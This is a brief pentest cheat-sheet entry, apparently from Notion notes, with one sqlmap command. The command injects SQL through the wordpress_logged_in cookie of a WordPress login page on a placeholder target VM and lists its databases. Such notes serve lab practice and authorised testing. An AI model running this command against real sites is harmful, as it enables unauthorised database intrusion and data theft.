# sqlmap cookie injection

OS: Linux
Description: sqlmap inject cookie
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

```jsx
sqlmap --dbms=mysql -u "http://IP_OF_TARGET_VM/wp-login.php" --cookie='wordpress_logged_in=*' --level=2 --dbs
```